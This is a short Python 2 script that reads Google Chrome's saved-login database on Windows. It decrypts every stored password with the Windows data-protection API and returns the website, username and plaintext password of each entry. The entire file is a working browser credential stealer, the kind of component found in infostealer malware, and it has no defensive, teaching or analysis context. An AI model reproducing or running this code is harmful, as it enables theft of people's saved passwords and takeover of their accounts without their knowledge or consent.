import os, sys
import sqlite3
import win32crypt
def main():
    info_list = []
    path = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
    try:
        os.chdir(path)
    except:
        return("Chrome is not installed.")
    print(os.getcwd())
    try:
        connection = sqlite3.connect("Login Data")
        with connection:
            cursor = connection.cursor()
            v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            value = v.fetchall()
        for information in value:
            if os.name == 'nt':
                password = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
                if password:
                    info_list.append({
                        'origin_url': information[0],
                        'username': information[1],
                        'password': str(password)
                    })
        output = ""
        for val in info_list:
            for key in val:
                if key == "origin_url":
                    wsite = val[key]
                elif key == "username":
                    uname = val[key]
                elif key == "password":
                    pword = val[key]
            formatted = "Website:  "+wsite+"\nUsername: "+uname+"\nPassword: "+pword+"\n\n"
            output += str(formatted)
         
         
         
         
    except sqlite3.OperationalError, e:
            e = str(e)
            if (e == 'database is locked'):
                return "[-]Database is locked. Is Chrome running?"
            elif (e == 'no such table: logins'):
                return "[-]Logins table is not present in the database."
            elif (e == 'unable to open database file'):
                return "[-]Database file does not exist."
            else:
                return "[-]Unknown error"
     
    return output